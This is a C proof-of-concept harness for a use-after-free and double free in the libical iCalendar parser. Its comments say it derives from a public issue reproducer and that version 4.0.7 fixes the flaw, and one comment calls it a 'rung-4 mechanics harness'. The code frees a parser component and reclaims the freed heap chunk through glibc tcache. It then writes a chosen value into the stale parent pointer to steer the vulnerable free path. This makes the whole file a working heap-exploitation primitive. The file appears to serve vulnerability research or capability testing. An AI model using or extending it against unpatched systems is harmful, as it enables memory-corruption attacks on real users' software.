#include <libical/ical.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* Frontier rung-4 mechanics harness, derived from the public issue #1444
 * reproducer. It uses only the documented public parser/component API. */
static icalcomponent *add(icalparser *parser, const char *text)
{
    char *line = icalmemory_strdup(text);
    if (!line) exit(2);
    icalcomponent *component = icalparser_add_line(parser, line);
    icalmemory_free_buffer(line);
    return component;
}

int main(int argc, char **argv)
{
    const char *mode = argc > 1 ? argv[1] : "chosen";
    int chosen = strcmp(mode, "chosen") == 0;
    int zero = strcmp(mode, "zero") == 0;
    if (!chosen && !zero) return 2;

    static const char *const lines[] = {
        "BEGIN:VCALENDAR", "VERSION:2.0",
        "BEGIN:VEVENT", "UID:reclaim@example.invalid"
    };
    icalparser *parser = icalparser_new();
    if (!parser) return 2;
    for (size_t i = 0; i < sizeof(lines) / sizeof(lines[0]); ++i) {
        (void)add(parser, lines[i]);
    }

    icalcomponent *first = icalparser_clean(parser);
    if (!first) return 2;
    uintptr_t first_address = (uintptr_t)first;
    icalcomponent_free(first);

    /* The freed component is a 72-byte malloc region. glibc tcache returns that
     * just-freed chunk to the next same-size malloc on this host. */
    unsigned char *reclaim = malloc(72);
    if (!reclaim) return 2;
    memset(reclaim, chosen ? 0x41 : 0x00, 72);
    uint64_t parent = chosen ? UINT64_C(0x4141414141414141) : 0;
    memcpy(reclaim + 48, &parent, sizeof(parent));

    printf("FIRST=%#jx RECLAIM=%p REUSE=%d OFFSET48=%#016jx MODE=%s\n",
           (uintmax_t)first_address, (void *)reclaim,
           (uintptr_t)reclaim == first_address, (uintmax_t)parent, mode);
    fflush(stdout);

    /* Vulnerable icalparser_free() calls icalcomponent_free() on the stale
     * root_component. At icalcomponent.c:197 it reads parent at offset 48:
     * zero continues into the double free; chosen nonzero takes the early
     * return. Fixed v4.0.7 cleared root_component and never calls this sink. */
    icalparser_free(parser);
    printf("SURVIVED mode=%s offset48_after=%#016jx\n", mode,
           (uintmax_t)*(uint64_t *)(reclaim + 48));
    free(reclaim);
    return 0;
}
